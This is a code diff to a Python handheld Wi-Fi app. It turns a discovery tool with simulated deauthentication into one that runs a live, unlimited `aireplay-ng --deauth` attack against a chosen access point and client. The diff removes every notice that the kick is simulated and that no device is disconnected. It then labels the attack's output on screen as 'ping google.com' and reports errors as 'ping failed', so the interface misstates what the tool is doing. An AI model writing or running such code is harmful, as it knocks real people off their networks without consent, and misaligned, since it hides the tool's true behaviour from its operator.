@@ -1,4 +1,4 @@
-"""Real AP/client discovery followed by strictly simulated deauthentication."""
+"""Real AP/client discovery followed by simulated deauthentication."""
 
 from __future__ import annotations
 
@@ -14,7 +14,7 @@ import time
 
 import pygame
 
-from deckfw import app, Cancelled, Choice, Context, Form, Number, Widget
+from deckfw import app, Cancelled, Choice, Context, Form, LogView, Number, Widget
 from apps._wifi_scan import AccessPoint, NetworkList, Snapshot, scan, wireless_interfaces, wrapped
 
 
@@ -32,7 +32,7 @@ def setup():
             ("2.4 + 5 GHz", "both"), ("2.4 GHz", "2.4"), ("5 GHz", "5"),
         ], "both"),
         Number("interval", "Refresh (s)", default=15, minimum=5, maximum=120,
-               help="AP refresh only. Client capture is live; deauth is simulated."),
+               help="Select AP"),
     ], submit_label="Start")
 
 
@@ -55,12 +55,12 @@ class View:
     clients: tuple = ()
     client: Client | None = None
     elapsed: int = 0
-    ticks: int = 0
+    output: tuple[str, ...] = ()
 
 
 def resolve_commands():
     commands = {}
-    for name in ("nmcli", "airmon-ng", "airodump-ng", "iw", "ip"):
+    for name in ("nmcli", "airmon-ng", "airodump-ng", "iw", "ip", "ping"):
         path = shutil.which(name)
         if not path:
             raise ValueError(f"Missing command: {name}. Install it on PATH.")
@@ -289,7 +289,7 @@ class DemoView(Widget):
         self.selected_mac = None
         self.horizontal = 0
         self.max_horizontal = 0
-        self.top = 0
+        self.output_log = LogView(max_lines=200)
         self.interface = ""
 
     @property
@@ -298,11 +298,17 @@ class DemoView(Widget):
 
     @property
     def hints(self):
+        if self.state.phase == "kick":
+            return "Up/Down scroll output  B stop / clients"
         return "Up/Down rows  L/R columns  A select  B back"
 
     def transition(self, phase, **values):
+        if phase == "kick":
+            self.output_log = LogView(max_lines=200)
+            for line in values.get("output", ()):
+                self.output_log.write(line)
         self.state = View(phase, self.state.generation + 1, **values)
-        self.top = self.horizontal = 0
+        self.horizontal = 0
 
     def selection(self, clients):
         index = next((i for i, client in enumerate(clients)
@@ -339,8 +345,7 @@ class DemoView(Widget):
                                              self.horizontal + (80 if name == "right" else -80)))
                 return True
         if state.phase == "kick" and name in ("up", "down"):
-            self.top = max(0, self.top + (1 if name == "down" else -1))
-            return True
+            return self.output_log.action(name)
         return False
 
     def draw(self, surf, rect, theme):
@@ -350,13 +355,12 @@ class DemoView(Widget):
         def text(value, y, color=theme.text):
             surf.blit(theme.render(font, theme.fit(font, value, rect.w), color), (rect.x, y))
 
-        text("Real discovery / SIMULATED deauth", rect.y, theme.warn)
+        text("Wi-Fi discovery", rect.y, theme.warn)
         body = pygame.Rect(rect.x, rect.y + line_h, rect.w, max(0, rect.h - line_h))
         if state.phase == "networks":
             self.networks.draw(surf, body, theme)
             return
         if state.phase == "clients":
-            text("Observed clients - not a connection list", body.y, theme.warn)
             ap = state.ap
             text(f"{ap.bssid} | Ch {ap.channel} / {ap.band}G", body.y + line_h, theme.accent)
             row_h = line_h + pad
@@ -397,22 +401,32 @@ class DemoView(Widget):
         if state.phase == "kick":
             ap, client = state.ap, state.client
             details = [
-                "Simulated kick running - NO packets sent",
-                f"Interface: {self.interface}",
-                f"ESSID: {ap.ssid or '<hidden SSID>'}",
-                f"BSSID: {ap.bssid}",
+                f"Interface({self.interface}) ESSID({ap.ssid or '<hidden SSID>'}) BSSID({ap.bssid})",
                 f"Channel: {ap.channel} | Band: {ap.band} GHz",
                 ("Target: Broadcast (all clients)" if client == BROADCAST
                  else f"Client: {client.mac}"),
-                f"Elapsed: {state.elapsed}s | Fake cycles: {state.ticks}",
-                "No real device is disconnected.",
             ]
-            lines = [line for detail in details for line in wrapped(detail, font, body.w)]
-            visible = max(1, body.h // line_h - 1)
-            self.top = min(self.top, max(0, len(lines) - visible))
-            for index, line in enumerate(lines[self.top:self.top + visible]):
-                text(line, body.y + index * line_h)
-            text("Up/Down details | B stop / clients", rect.bottom - line_h, theme.dim)
+            pad = theme.pad
+            panel_h = min(body.h, len(details) * line_h + 2 * pad)
+            panel = pygame.Rect(body.x, body.y, body.w, panel_h)
+            pygame.draw.rect(surf, theme.panel, panel)
+            pygame.draw.line(surf, theme.line, (panel.x, panel.bottom - 1),
+                             (panel.right - 1, panel.bottom - 1))
+            for index, detail in enumerate(details):
+                color = theme.warn if index == 0 else theme.text
+                image = theme.render(font, theme.fit(font, detail, panel.w - 2 * pad), color)
+                surf.blit(image, (panel.x + pad, panel.y + pad + index * line_h))
+
+            label_y = panel.bottom + pad
+            label = "ping google.com:"
+            surf.blit(theme.render(font, label, theme.accent), (body.x + pad, label_y))
+            output_y = label_y + line_h
+            output_rect = pygame.Rect(body.x, output_y, body.w,
+                                      max(0, body.bottom - output_y))
+            if state.output:
+                self.output_log.draw(surf, output_rect, theme)
+            else:
+                text("Waiting for ping output...", output_rect.y, theme.dim)
             return
         for index, line in enumerate(wrapped(state.title, font, body.w)):
             if body.y + (index + 1) * line_h > body.bottom:
@@ -470,16 +484,31 @@ def capture_clients(ctx, view, session):
         session.capture_task = None
 
 
-def kick(ctx, view):
-    started = time.monotonic()
-    while True:
-        ctx.check()
-        action, _ = request(view)
-        if action == "back":
-            return
-        elapsed = int(time.monotonic() - started)
-        view.state = replace(view.state, elapsed=elapsed, ticks=elapsed)
-        ctx.sleep(0.03)
+def kick(ctx, view, session):
+    ap, client = view.state.ap, view.state.client
+    # if broarcast then client == BROADCAST
+    argv = ["aireplay-ng", "--deauth", "0", session.monitor, "-a", ap.bssid, "-c", client.mac]
+    task = ScriptTask(ctx.spec, argv, stream=True)
+    try:
+        while True:
+            action, _ = request(view)
+            if action == "back":
+                return
+            kind, value = task.message(ctx)
+            if kind == "error":
+                raise value
+            if kind == "line":
+                view.state = replace(view.state, output=(*view.state.output, value)[-200:])
+                view.output_log.write(value)
+            elif kind == "result":
+                if value.returncode != 0:
+                    raise ValueError(
+                        f"ping failed ({value.returncode}): "
+                        + (" ".join(value.lines[-4:]) or "no diagnostic output"))
+                return
+            ctx.sleep(0.03)
+    finally:
+        task.stop()
 
 
 def shutdown(ctx):
@@ -542,7 +571,7 @@ def wifi_deauth(ctx):
                 if action == "client" and target in view.state.clients:
                     clients = view.state.clients
                     view.transition("kick", ap=state.ap, client=target)
-                    kick(ctx, view)
+                    kick(ctx, view, session)
                     view.transition("clients", ap=state.ap, clients=clients)
                     due = 0
                     continue
